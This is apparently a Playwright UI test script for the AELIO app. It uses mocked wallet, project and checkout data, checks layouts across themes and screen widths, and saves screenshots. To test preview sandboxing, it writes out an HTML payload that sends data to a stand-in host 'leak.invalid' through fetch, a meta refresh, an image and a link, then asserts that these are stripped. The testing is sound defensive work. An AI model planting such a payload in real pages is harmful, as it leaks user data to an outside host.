"""Local UI fixtures. No live wallet, purchase, deployment or AI execution claims."""
import json,time,uuid,os
from pathlib import Path
from playwright.sync_api import sync_playwright
from browser_fixtures import *
R=Path(__file__).resolve().parents[2];BASE=os.environ.get('AELIO_BROWSER_BASE','http://127.0.0.1:8102');OUT=R/'docs/previews/native-v1.0.15';OUT.mkdir(parents=True,exist_ok=True)
projects={};versions={};saves=[];checkouts=[];external=[]
wallet={'credits':43,'unlimited':False,'earnings':{'gross_cents':10000,'fee_cents':2000,'net_cents':8000,'pending_cents':2000,'available_cents':6000,'paid_cents':0},'transactions':[{'source':'LOCAL SAMPLE · agent sale','gross_cents':10000,'fee_cents':2000,'net_cents':8000,'status':'available','currency':'usd'}],'payouts_enabled':False,'payout_account_status':'not_connected','legacy':{'connected':True,'overview':{'total_available':57,'exempt':False},'packages':[{'id':'sample-small','name':'LOCAL SAMPLE · credit pack','credits':50,'price_cents':900,'currency':'usd'}],'payments':{'usable':True,'configured':True,'mode':'test'},'transactions':[],'purchases':[]},'subscriptions':[],'allowances':[]}
def api(route):
 pth=route.request.url.split('/api/platform',1)[-1].split('?')[0];method=route.request.method
 if pth=='/native/catalog':d={'images':{'enabled':False,'issue':'Image execution is not enabled in this local fixture.'}}
 elif pth=='/native/projects':
  if method=='GET':d={'projects':list(projects.values())}
  else:
   doc=route.request.post_data_json;pid=str(uuid.uuid4());p={**doc,'id':pid,'revision':1,'created_at':'2026-10-31T12:00:00Z','updated_at':'2026-10-31T12:00:00Z'};projects[pid]=p;versions[pid]=[{'revision':1,'snapshot':doc,'created_at':'2026-10-31T12:00:00Z'}];saves.append(p);d={'project':p}
 elif pth.startswith('/native/projects/'):
  pid=pth.split('/')[3]
  if pth.endswith('/versions'):d={'versions':versions[pid]}
  elif method=='PATCH':
   doc=route.request.post_data_json
   if doc['expected']!=projects[pid]['revision']:return route.fulfill(status=409,content_type='application/json',body='{"error":"Saved data changed in another session. Reload before saving.","code":"revision_conflict"}')
   p={**doc,'id':pid,'revision':projects[pid]['revision']+1,'updated_at':'2026-10-31T12:30:00Z'};projects[pid]=p;versions[pid].insert(0,{'revision':p['revision'],'snapshot':doc,'created_at':'2026-10-31T12:30:00Z'});saves.append(p);d={'project':p}
  else:d={'project':projects[pid]}
 elif pth=='/native/wallet':d=wallet
 elif pth=='/native/cloud':d={'files':[]}
 elif pth=='/native/checkout':checkouts.append(route.request.post_data_json);d={'url':'https://checkout.stripe.com/c/local-fixture-only'}
 else:return mock(route)
 route.fulfill(content_type='application/json',body=json.dumps(d))
def badge(page):
 page.evaluate("""()=>{if(document.querySelector('#native-fixture'))return;const b=document.createElement('div');b.id='native-fixture';b.textContent='LOCAL REVIEW · SYNTHETIC ACCOUNT / WALLET';b.style.cssText='position:fixed;bottom:4px;right:5px;z-index:99999;color:#fff2ce;background:#10141feb;font:8px system-ui;padding:5px 7px;border:1px solid #8d7548;border-radius:5px;pointer-events:none';document.body.append(b)}""")
def section(page,width,name):
 if width<=900:page.get_by_role('button',name='Open conversations',exact=True).click()
 page.locator('.native-navigation').get_by_role('button',name=name,exact=True).click()
def no_overflow(page):assert page.evaluate('document.documentElement.scrollWidth<=innerWidth')
with sync_playwright()as p:
 b=p.chromium.launch(executable_path='/usr/bin/chromium',args=['--no-sandbox']);report=[]
 for width,theme in [(1440,'midnight'),(390,'midnight'),(1440,'blueprint'),(390,'blueprint'),(320,'midnight'),(430,'midnight')]:
  account['preferences']['appearance']={'design':'og-dark'};ctx=b.new_context(viewport={'width':width,'height':1000 if width==1440 else 900},reduced_motion='reduce');ctx.add_init_script("if(window.top===window){localStorage.setItem('aelio.native.appearance',"+json.dumps(theme)+");localStorage.setItem('aelio.auth',"+json.dumps(json.dumps({'access_token':'fixture-user','refresh_token':'fixture-refresh','expires_at':time.time()+3600,'user':{'id':A}}))+");}")
  page=ctx.new_page();errors=[];page.on('pageerror',lambda e:errors.append(str(e)));page.route('https://**/*',lambda r:r.abort());page.route('**/api/platform/**',api);page.route('**/assets/config.js',api);page.goto(BASE+'/#native',wait_until='domcontentloaded');page.get_by_role('heading',name='Intelligence, put to work.').wait_for();badge(page);no_overflow(page)
  assert page.get_by_label('Workspace',exact=True).locator('option').count()==3
  assert not page.get_by_role('button',name='Studio Brain · Private ↗').count()
  if width<=900:page.get_by_role('button',name='Open conversations',exact=True).click()
  nav=page.locator('.native-navigation');assert 'Voice'not in nav.inner_text();assert nav.locator('details').count()==5;assert nav.locator('details button').count()==18
  page.screenshot(path=str(OUT/f'navigation-{theme}-{width}.png'))
  if width<=900:page.get_by_role('button',name='Open conversations',exact=True).click()
  if width in [1440,390]:page.screenshot(path=str(OUT/f'overview-{theme}-{width}.png'))
  section(page,width,'Dream Code');page.get_by_role('button',name='＋ New project',exact=True).click();page.get_by_label('Project name',exact=True).fill('LOCAL SAMPLE · Coastal notes '+str(width)+' '+theme)
  source='<h1>Private project preview</h1><style>body{font:20px system-ui;background:#f7ecd4;padding:30px;color:#22344b}</style><script>parent.postMessage("bad","*");fetch("https://leak.invalid/stolen")</script><meta http-equiv="refresh" content="0;url=https://leak.invalid/refresh"><img src="https://leak.invalid/image"><a href="https://leak.invalid/click">Blocked link</a>'
  page.get_by_label('Project source',exact=True).fill(source);page.get_by_role('button',name='Save project',exact=True).click();page.get_by_text('Saved to your account · version 1',exact=True).wait_for();pid=saves[-1]['id']
  page.get_by_label('Project source',exact=True).fill(source+'<p>Second version.</p>');page.get_by_role('button',name='Save project',exact=True).click();page.get_by_text('Saved to your account · version 2',exact=True).wait_for()
  page.get_by_role('button',name='Preview draft',exact=True).click();iframe=page.locator('iframe[title="Isolated static project preview"]');assert iframe.get_attribute('sandbox')=='';frame=page.frame_locator('iframe[title="Isolated static project preview"]');frame.get_by_role('heading',name='Private project preview').wait_for();assert frame.locator('script,meta[http-equiv=refresh],a[href],img[src]').count()==0
  assert not page.evaluate('window.__nativePreviewLeaked||false');no_overflow(page)
  if width in [1440,390]:page.screenshot(path=str(OUT/f'code-{theme}-{width}.png'))
  with page.expect_download()as download:page.get_by_role('button',name='Export source',exact=True).click()
  assert download.value.suggested_filename.endswith('.aelio.json')
  page.get_by_role('button',name='Version history',exact=True).click();page.locator('.native-versions>div').nth(1).wait_for();assert page.locator('.native-versions>div').count()==2
  section(page,width,'Dream Memory');page.get_by_label('Project memory').fill('Private LOCAL FIXTURE · project decision.');page.get_by_role('button',name='Save project',exact=True).click();page.get_by_text('Saved to your account · version 3',exact=True).wait_for()
  section(page,width,'Dream Deploy');page.get_by_label('GitHub repository URL').fill('https://github.com/example/local-sample');page.get_by_label('Environment variable names').fill('SERVER_SIDE_KEY');page.get_by_role('button',name='Save project',exact=True).click();page.get_by_text('Saved to your account · version 4',exact=True).wait_for();assert page.get_by_role('button',name='Approve & publish · not connected').is_disabled()
  if width in [1440,390]:page.screenshot(path=str(OUT/f'deploy-{theme}-{width}.png'))
  for name in ['AELIO Wallet','Credits & Billing','Earnings & Payouts']:
   section(page,width,name);page.get_by_text('43',exact=True).wait_for();no_overflow(page)
   if name=='Credits & Billing':
    page.get_by_role('button',name='Review purchase',exact=True).click();assert not checkouts;page.get_by_role('dialog',name='Confirm credit purchase').wait_for();page.get_by_role('button',name='Cancel',exact=True).click();assert not checkouts
   if name=='Earnings & Payouts':assert page.get_by_role('button',name='Request withdrawal · not available').is_disabled()
   if width in [1440,390]:page.screenshot(path=str(OUT/f'{name.split()[0].lower()}-{theme}-{width}.png'))
  for name in ['Dream Cloud','Image Studio','Animation Studio','3D & Design Studio','Agent Builder','AELIO University','Agent Marketplace','Appearance / Themes','Settings']:
   section(page,width,name);no_overflow(page)
  assert len(projects[pid]['files'])==1 and projects[pid]['memory'].startswith('Private LOCAL FIXTURE')
  assert len(versions[pid])==4;page.reload(wait_until='domcontentloaded');page.get_by_role('heading',name='Intelligence, put to work.').wait_for();section(page,width,'My Projects');page.locator('.native-project-list').get_by_role('button').filter(has_text=projects[pid]['title']).click();page.get_by_label('Project name').wait_for();assert page.get_by_label('Project source').input_value().endswith('<p>Second version.</p>')
  assert not errors,errors;ctx.close();report.append({'width':width,'theme':theme,'navigation':True,'projects_versions_export':True,'memory_deploy_config':True,'preview_opaque_and_scripts_removed':True,'wallet_confirmation_no_charge':True,'overflow':False});print('PASS',width,theme,flush=True)
 b.close();OUT.joinpath('checks.json').write_text(json.dumps({'checks':report,'all_financial_data':'SYNTHETIC LOCAL FIXTURES','live_payment_or_payout':False,'physical_iOS_tested':False},indent=2))
